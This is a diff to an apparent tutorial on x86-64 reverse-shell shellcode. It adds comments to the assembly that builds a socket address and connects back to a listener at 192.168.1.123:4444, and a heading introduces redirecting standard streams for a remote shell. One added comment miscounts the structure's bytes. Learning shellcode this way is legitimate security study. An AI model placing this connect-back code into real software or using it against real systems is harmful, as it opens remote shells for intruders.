@@ -200,6 +200,8 @@ Again, if the block of code above makes no sense to you then go and read the pre
 
 <h3>Stage 2 - Initiate the connection back to remote server</h3>
 
+Let's now construct the data structure for the connect syscall to use and initiate the actual connection back to our listener. Remember to use python to figure out what values to put in your Assembly code. Remember that our sock file descriptor is already stored in rdi for this step.
+
 ```c
 server.sin_family = AF_INET; //Address Family
 server.sin_port = htons(atoi(arguments[2])); //Network Byte order of the port to bind to. 
@@ -211,19 +213,18 @@ connect(sock, (struct sockaddr *)&server, sockaddr_len);
 ```
 
 ```nasm
-xor rax, rax
+xor rax, rax ;make sure rax is zero
 
-push rax
+push rax ;push 8 zero bytes to the stack for bzero        
+mov dword [rsp-4], 0x7b01a8c0 ;Move the 4 byte IP Address of our listener onto the stack using private Ip of one of my machines
+mov word [rsp-6], 0x5c11 ;Move the 2 byte desired port onto the stack
+mov word [rsp-8], 0x2 ;Value for AF_INET
+sub rsp, 8 ;Move the stack pointer 8 bytes to point to our data structure
         
-mov dword [rsp-4], 0x7b01a8c0 ;using private Ip of another machine
-mov word [rsp-6], 0x5c11
-mov word [rsp-8], 0x2
-sub rsp, 8
-        
-mov rax, 42
-mov rsi, rsp
-mov rdx, 16
-syscall       
+mov rax, 42 ;connect syscall value
+mov rsi, rsp ;pointer to our data structure 
+mov rdx, 16 ;length of the data structure - 8 zero bytes + 4 byet IP + 2 byte port + 1 byte AF_INET
+syscall ;initiate connection
 ```
 
 <h3>Stage 3 - Map STDIN/STDOUT and STDERROR to the new socket for remote shell capabilities</h3>
